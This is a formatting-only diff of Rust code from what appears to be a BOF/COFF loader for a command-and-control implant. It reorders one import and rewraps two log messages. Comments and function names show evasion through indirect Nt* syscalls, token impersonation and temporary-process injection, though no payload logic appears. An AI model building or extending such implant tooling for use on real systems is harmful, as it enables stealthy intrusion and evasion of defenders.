@@ -44,9 +44,9 @@ use std::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};
 // VirtualAlloc/VirtualFree/VirtualProtect removed — using Nt* indirect syscalls
 // CreateThread/WaitForSingleObject removed — using NtCreateThreadEx/NtWaitForSingleObject indirect syscalls
 // CreateEventW removed — was unused
-use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ};
 use crate::win_types::PAGE_READWRITE;
 use windows_sys::Win32::System::Memory::PAGE_READONLY;
+use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ};
 // ── Constants ────────────────────────────────────────────────────────────────
 
 /// Maximum BOF size (1 MB).
@@ -620,7 +620,9 @@ unsafe extern "C" fn beacon_use_token(token_handle: *mut c_void) -> i32 {
     ) {
         Some(a) => a,
         None => {
-            tracing::warn!("[coff_loader] BeaconUseToken: failed to resolve ImpersonateLoggedOnUser");
+            tracing::warn!(
+                "[coff_loader] BeaconUseToken: failed to resolve ImpersonateLoggedOnUser"
+            );
             return -1;
         }
     };
@@ -811,7 +813,9 @@ unsafe extern "C" fn beacon_inject_temporary_process(
     p_offset: i32,
 ) -> i32 {
     if payload.is_null() || p_len <= 0 {
-        tracing::warn!("[coff_loader] BeaconInjectTemporaryProcess: null payload or invalid length");
+        tracing::warn!(
+            "[coff_loader] BeaconInjectTemporaryProcess: null payload or invalid length"
+        );
         return -1;
     }
 
